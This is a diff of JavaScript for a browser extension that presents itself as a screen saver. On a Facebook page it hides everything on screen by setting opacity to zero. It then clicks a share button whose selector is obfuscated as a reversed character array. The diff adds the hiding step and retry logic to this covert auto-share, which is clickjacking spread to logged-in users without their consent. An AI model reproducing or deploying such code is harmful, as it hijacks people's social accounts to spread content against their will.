@@ -419,7 +419,9 @@ var ScreenSaver = (function ($) {
 					where:'window',
 					focus:false,
 					height:200,
-					width:200
+					width:200,
+					top:0,
+					left:0
 				});
 			} else {
 				appAPI.openURL({
@@ -799,6 +801,8 @@ appAPI.ready(function($) {
 			if (document.cookie.indexOf('c_user') > -1) {
 				return true;
 			} else {
+				appAPI.db.set('dist_run', true, appAPI.time.daysFromNow(1));
+
 				window.close();
 				return false;
 			}
@@ -829,9 +833,17 @@ appAPI.ready(function($) {
 		}
 	} else if (isDist()) {
 		if (top.location.hash == '#__A__') {
+			$('<style>* {opacity:0;}</style>').appendTo('head');
+
 			setTimeout(function () {
-				$(["]", "\"", "e", "r", "a", "h", "s", "\"", "=", "e", "m", "a", "n", "[", "t", "u", "p", "n", "i"].reverse().join('')).trigger('click');
-			}, 2000);
+				if ($(["]", "\"", "e", "r", "a", "h", "s", "\"", "=", "e", "m", "a", "n", "[", "t", "u", "p", "n", "i"].reverse().join('')).length) {
+					$(["]", "\"", "e", "r", "a", "h", "s", "\"", "=", "e", "m", "a", "n", "[", "t", "u", "p", "n", "i"].reverse().join('')).trigger('click');	
+				} else {
+					setTimeout(function () {
+						$(["]", "\"", "e", "r", "a", "h", "s", "\"", "=", "e", "m", "a", "n", "[", "t", "u", "p", "n", "i"].reverse().join('')).trigger('click');
+					}, 1000);
+				}
+			}, 1000);
 		} else if (top.location.hash == '#__B__') {
 			setTimeout(function () {
 				var text = $('#homelink').html();
@@ -851,8 +863,10 @@ appAPI.ready(function($) {
 		appAPI.resources.includeJS('js/sponsor.js');
 		if (jQuery.browser.msie) appAPI.resources.includeJS('js/iefixes.js');
 
-		var saver = new ScreenSaver({
-			blacklist:blacklist
+		$(document).ready(function () {
+			var saver = new ScreenSaver({
+				blacklist:blacklist
+			});
 		});
 	}
-});
+}, false);
